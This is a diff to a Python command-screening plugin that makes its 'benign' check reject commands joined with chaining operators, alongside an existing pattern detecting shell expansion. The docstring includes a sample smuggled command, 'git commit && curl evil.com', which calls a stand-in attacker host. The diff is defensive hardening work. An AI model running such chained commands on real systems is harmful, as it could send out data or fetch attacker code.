@@ -70,6 +70,10 @@ _BENIGN_PATTERNS = [
     ]
 ]
 
+# Command chaining operators -- presence means a "benign" prefix does not
+# guarantee the entire command is benign (Finding F7 fix).
+_CHAIN_OPERATORS_RE = re.compile(r"\s*(?:&&|\|\||;)\s*")
+
 # Shell expansion patterns
 _SHELL_EXPANSION_RE = re.compile(r"\$\(|\$\{|`[^`]+`|\beval\s|\bexec\s|\bsource\s")
 
@@ -212,8 +216,15 @@ class HeuristicScorerPlugin(ScreeningPlugin):
         return re.split(r"[\s|;&()]+", content.lower())
 
     def _is_benign(self, content: str) -> Optional[str]:
-        """Check if content matches a known-benign pattern."""
+        """Check if content matches a known-benign pattern.
+
+        Returns None (not benign) if command chaining operators are detected,
+        since a benign prefix (e.g. 'git commit') does not make the entire
+        chained command benign (e.g. 'git commit && curl evil.com').
+        """
         stripped = content.strip()
+        if _CHAIN_OPERATORS_RE.search(stripped):
+            return None
         for pattern in _BENIGN_PATTERNS:
             if pattern.match(stripped):
                 return pattern.pattern
